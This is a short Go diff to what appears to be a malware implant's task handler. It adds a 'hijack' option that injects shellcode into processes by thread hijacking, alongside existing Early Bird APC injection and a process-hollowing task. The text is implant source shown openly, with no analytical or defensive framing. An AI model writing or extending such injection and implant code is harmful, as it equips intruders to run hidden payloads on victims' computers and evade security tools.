@@ -263,6 +263,11 @@ func (imp *Implant) executeTask(task protocol.Task) *protocol.TaskResult {
 				if err == nil {
 					output = []byte("[+] Shellcode injected via Early Bird APC")
 				}
+			} else if len(task.Args) > 1 && task.Args[1] == "hijack" {
+				err = injectThreadHijackCrossPlatform(task.Data)
+				if err == nil {
+					output = []byte("[+] Shellcode injected via thread hijacking")
+				}
 			} else {
 				pid := 0
 				fmt.Sscanf(task.Args[0], "%d", &pid)
@@ -272,7 +277,7 @@ func (imp *Implant) executeTask(task protocol.Task) *protocol.TaskResult {
 				}
 			}
 		} else {
-			err = errMissingArgs("inject requires PID and shellcode data, or 'earlybird' method")
+			err = errMissingArgs("inject requires PID and shellcode data, or 'earlybird'/'hijack' method")
 		}
 
 	case protocol.TaskHollow:
